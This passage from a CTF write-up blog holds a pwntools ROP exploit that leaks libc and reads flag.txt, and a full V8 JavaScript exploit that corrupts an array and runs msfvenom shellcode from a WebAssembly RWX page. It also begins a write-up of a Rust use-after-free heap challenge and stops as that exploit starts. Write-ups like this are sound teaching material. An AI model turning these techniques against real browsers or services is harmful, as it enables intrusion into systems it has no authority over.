&#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30006</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	pop_rdi = <span class="number">0x04019db</span></span><br><span class="line">	ret = <span class="number">0x0401016</span></span><br><span class="line">	bss = <span class="number">0x404000</span> + <span class="number">0x100</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(<span class="number">0x4011DA</span>)</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	libc_base = leak - <span class="number">0x0809c0</span></span><br><span class="line">	li(<span class="string">&#x27;lib_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x23e6a</span></span><br><span class="line">	pop_rax = libc_base + <span class="number">0x439c8</span></span><br><span class="line">	libc_read = libc_base + <span class="number">0x110070</span></span><br><span class="line">	libc_open = libc_base + <span class="number">0x10fc40</span></span><br><span class="line">	syscall = libc_base + <span class="number">0x11007f</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	p += p64(pop_rdi) + p64(<span class="number">0x0</span>)</span><br><span class="line">	p += p64(pop_rsi) + p64(bss)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0x100</span>)</span><br><span class="line">	p += p64(libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># open</span></span><br><span class="line">	p += p64(pop_rdi) + p64(bss)</span><br><span class="line">	p += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">	p += p64(syscall)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	p += p64(pop_rdi) + p64(<span class="number">0x3</span>)</span><br><span class="line">	p += p64(pop_rsi) + p64(bss)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0x40</span>)</span><br><span class="line">	p += p64(libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(bss)</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#p = b&#x27;/chal/flag.txt\x00&#x27;</span></span><br><span class="line">	p = <span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line">	sl(p);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="5-is-this-pwn-or-web"><a href="#5-is-this-pwn-or-web" class="headerlink" title="5 [is-this-pwn-or-web]"></a>5 [is-this-pwn-or-web]</h2><p>This puzzle is not a python sandbox escape, it is a javascript memory overflow.</p>
<h3 id="js-exp"><a href="#js-exp" class="headerlink" title="js exp"></a>js exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This challenge is meant to be extremely hard. The way this exploit goes is</span></span><br><span class="line"><span class="comment"> * essentially as follows:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Step 1: Read the patch.diff file to figure out the vulnerability</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Step 2: Use the vulnerability to get a corrupted float array. You can use</span></span><br><span class="line"><span class="comment"> *         this array to overwrite its own length to a very large number</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Step 3: Once you&#x27;ve done this, exploitation becomes (relatively) easy. There</span></span><br><span class="line"><span class="comment"> *         are loads of blog posts and other V8 exploits that you can use as</span></span><br><span class="line"><span class="comment"> *         a starting point. I&#x27;ll list some below. The only issue will be that</span></span><br><span class="line"><span class="comment"> *         V8 somewhat recently started shipping with pointer compression, and</span></span><br><span class="line"><span class="comment"> *         most blog posts / exploits will be made for challenges / vulns from</span></span><br><span class="line"><span class="comment"> *         V8 versions without pointer compression.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</span></span><br><span class="line"><span class="comment"> * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/</span></span><br><span class="line"><span class="comment"> * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration</span></span><br><span class="line"><span class="comment"> * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)</span></span><br><span class="line"><span class="comment"> * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you still have questions regarding this challenge, feel free to DM me </span></span><br><span class="line"><span class="comment"> * anywhere. I&#x27;ll do my best to respond to queries!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Discord: Faith#2563</span></span><br><span class="line"><span class="comment"> * Twitter: @farazsth98</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper functions setup to convert between doubles and numbers when needed</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u32_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) == float</span></span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> BigInt(u32_buf[<span class="number">0</span>]) + (BigInt(u32_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>); <span class="comment">// Watch for little endianness</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) == BigInt</span></span><br><span class="line">    u32_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u32_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) == BigInt</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + val.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We set up a web assembly page. This is mapped as an RWX page that we will</span></span><br><span class="line"><span class="comment">// later write shellcode into.</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] WebAssembly RWX page setup!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Next, set up three arrays. These will be allocated one after another because</span></span><br><span class="line"><span class="comment">// of the deterministic nature of the V8 heap. We corrupt the float array.</span></span><br><span class="line"><span class="comment">// You can find their offsets relative to each other using GDB.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// While we do this, we also trigger the vulnerability to get a corrupted</span></span><br><span class="line"><span class="comment">// float array in `float_arr`</span></span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>];</span><br><span class="line">float_arr = float_arr.slice(<span class="number">0</span>); <span class="comment">// Trigger the vuln</span></span><br><span class="line"><span class="keyword">var</span> addrof_arr = [&#123;&#125;, &#123;&#125;]; <span class="comment">// Used for the addrof primitive later</span></span><br><span class="line"><span class="keyword">var</span> arb_read_arr = [<span class="number">1.1</span>]; <span class="comment">// Used for the arbitrary read primitive later</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We set up an ArrayBuffer and a DataView. We will use these later to write </span></span><br><span class="line"><span class="comment">// our shellcode into the RWX page.</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Corrupting float_arr&#x27;s length to 2048&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// We need to store the current `elements` ptr before we corrupt the length</span></span><br><span class="line"><span class="comment">// because corrupting the length also requires us to corrupt the `elements` ptr</span></span><br><span class="line"><span class="comment">// in the process</span></span><br><span class="line"><span class="keyword">var</span> float_arr_elem = ftoi(float_arr[<span class="number">2</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Corrupt the length and keep the `elements` ptr intact</span></span><br><span class="line">float_arr[<span class="number">2</span>] = itof((<span class="number">0x1000n</span> &lt;&lt; <span class="number">32n</span>) + float_arr_elem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (float_arr.length === <span class="number">2048</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[+] Corruption successful!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[!] Corruption failed. Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">throw</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup addrof primitive</span></span><br><span class="line"><span class="comment">// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]</span></span><br><span class="line"><span class="comment">// We simply set addrof_arr[0] to the object whose address we want to leak</span></span><br><span class="line"><span class="comment">// Then we read from float_arr[4]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    addrof_arr[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(float_arr[<span class="number">4</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Addrof primitive has been setup&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup an arbitrary read primitive for the V8 compressed heap</span></span><br><span class="line"><span class="comment">// We do this by overwriting the elements pointer of our arb_read_arr to a</span></span><br><span class="line"><span class="comment">// chosen address - 8 (making sure to keep the length set to 0x1000). We</span></span><br><span class="line"><span class="comment">// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).</span></span><br><span class="line"><span class="comment">// The elements pointer of arb_read_arr is at float_arr[17], offset found</span></span><br><span class="line"><span class="comment">// through GDB.</span></span><br><span class="line"><span class="comment">// addr must be a 32-bit value here</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compressed_arb_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    float_arr[<span class="number">17</span>] = itof((<span class="number">0x1000n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(arb_read_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Arbitrary read primitive for the compressed heap has been setup&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup a function that writes our shellcode to a given address</span></span><br><span class="line"><span class="comment">// We do this by overwriting the backing store address of the ArrayBuffer we</span></span><br><span class="line"><span class="comment">// previously allocated to our chosen address. We then use the DataView that we</span></span><br><span class="line"><span class="comment">// also allocated to write our shellcode to that address space.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Using GDB, we find that the backing store address of our ArrayBuffer is</span></span><br><span class="line"><span class="comment">// misaligned at float_arr[20] and float_arr[21]. The misalignment is as</span></span><br><span class="line"><span class="comment">// follows:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of</span></span><br><span class="line"><span class="comment">//   the backing store address</span></span><br><span class="line"><span class="comment">// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of</span></span><br><span class="line"><span class="comment">//   the backing store address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If this is confusing to you, that&#x27;s because it is very confusing :p I would</span></span><br><span class="line"><span class="comment">// suggest looking at this in GDB and comparing whatever I mentioned above to</span></span><br><span class="line"><span class="comment">// what you see in GDB until it makes sense</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// addr must be a 64-bit value here</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The backing store address of buf is not aligned to 64 bytes, so we have</span></span><br><span class="line">    <span class="comment">// to write the upper 32-bits and the lower 32-bits of our address to two</span></span><br><span class="line">    <span class="comment">// separate indices like this</span></span><br><span class="line">    float_arr[<span class="number">20</span>] = itof((addr &amp; <span class="number">0xffffffffn</span>) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    float_arr[<span class="number">21</span>] = itof((addr &amp; <span class="number">0xffffffff00000000n</span>) &gt;&gt; <span class="number">32n</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// msfvenom -p linux/x64/exec CMD=&#x27;./flagprinter&#x27; --format dword</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0x99583b6a</span>, <span class="number">0x622fbb48</span>, <span class="number">0x732f6e69</span>, <span class="number">0x48530068</span>, <span class="number">0x2d68e789</span>, <span class="number">0x48000063</span>, <span class="number">0xe852e689</span>, <span class="number">0x0000000e</span>, </span><br><span class="line"><span class="number">0x6c662f2e</span>, <span class="number">0x72706761</span>, <span class="number">0x65746e69</span>, <span class="number">0x57560072</span>, <span class="number">0x0fe68948</span>, <span class="number">0x00000005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now, we leak the address of our RWX page</span></span><br><span class="line"><span class="comment">// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)</span></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = compressed_arb_read(addrof(wasm_instance) + <span class="number">0x68n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] RWX page address found: &quot;</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Finally, we copy our shellcode to the RWX page and call the WASM function to</span></span><br><span class="line"><span class="comment">// execute it.</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Copying ./flagprinter shellcode to RWX page&quot;</span>);</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Printing flag!&quot;</span>);</span><br><span class="line">f();</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="6-Zombie"><a href="#6-Zombie" class="headerlink" title="6 [Zombie]"></a>6 [Zombie]</h2><p>This is a medium heap exploit which involves exploiting a soundness hole in the rust type system. Everything is already set up for you, so you don’t have to think too hard about the actual soundness hole though.</p>
<p>The idea here is that you first create a dangling reference to a freed block of memory on the heap. This is done through the <code>infect</code> command, which calls the <code>zombie</code> function with a user provided parameter.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">zombie</span></span>(size: <span class="built_in">usize</span>) -&gt; &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> [<span class="built_in">u8</span>] &#123;</span><br><span class="line">	<span class="keyword">let</span> <span class="keyword">mut</span> object = <span class="built_in">vec!</span>[<span class="string">b&#x27;A&#x27;</span>; size];</span><br><span class="line">	<span class="keyword">let</span> r = virus(object.as_mut());</span><br><span class="line">	r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This zombie function first creates a heap allocated array filled with 0x41 of a user defined size, then calls the <code>virus</code> function.</p>
<p>This is a modification of rustlang issue 25860 as hinted in the code comments.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rust-lang/rust/issues/25860">https://github.com/rust-lang/rust/issues/25860</a></p>
<p>This is a long standing hole in rust’s (normally memory safe) type system which allows one to convert a reference lifetime to the static lifetime and therefore bypass rust’s borrow checker: convert <code>&amp;&#39;a T</code> to <code>&amp;&#39;static T</code> and a big no-no for memory safety.</p>
<p>I have modified this to work with a mutable pointer so now there is a dangling reference which can be used to both read from, and write to the freed block of memory.</p>
<p>Usually this could be done easily using rust’s <code>unsafe</code> keyword, but I decided to make this challenge extra baffling in exchange for source code access.</p>
<h3 id="The-Challenge"><a href="#The-Challenge" class="headerlink" title="The Challenge"></a>The Challenge</h3><p>The idea behind this challenge is that we have a shell with various commands, one of which is the “get flag” command, however that command is hardcoded to be ignored and a new command read in.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> line.as_str().trim() &#123;</span><br><span class="line">	<span class="string">&quot;get flag&quot;</span> =&gt; <span class="keyword">continue</span>,</span><br><span class="line">	<span class="string">&quot;infect&quot;</span> =&gt; infected = <span class="literal">Some</span>(infect(&amp;<span class="keyword">mut</span> lines)),</span><br><span class="line">	<span class="string">&quot;eat brains&quot;</span> =&gt; eat_brains(&amp;<span class="keyword">mut</span> lines, &amp;<span class="keyword">mut</span> infected),</span><br><span class="line">	<span class="string">&quot;inspect brains&quot;</span> =&gt; inspect_brains(&amp;<span class="keyword">mut</span> lines, &amp;<span class="keyword">mut</span> infected),</span><br><span class="line">	_ =&gt; (),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>after the command is finished executing there is another check to see if the command was “get flag”, and if it was the flag is printed out.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> line.as_str().trim() == <span class="string">&quot;get flag&quot;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> flag = read_to_string(<span class="string">&quot;flag.txt&quot;</span>).unwrap();</span><br><span class="line">	<span class="built_in">println!</span>(<span class="string">&quot;Here&#x27;s the flag: &#123;&#125;&quot;</span>, &amp;flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So we need to change the command while it is still inside the buffer during the execution of one of our commands.</p>
<p>We also have other commands, “eat brains” and “inspect brains” which allow us to read from and write to our dangling reference returned from the <code>infect</code> function.</p>
<p>The final piece of the puzzle is understanding how the <code>String</code> struct works in rust. It contains a pointer to the heap, and will reallocate to grow when all the heap space for its buffer is used up. In this case we are reading stdin line by line, so if a line is longer than any have previously been, it is possible to force the String struct in the line variable to reallocate to a buffer that we have previously freed.</p>
<h3 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h3><p>First our normal setup:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p>Now our first step is to create our dangling pointer:</p>
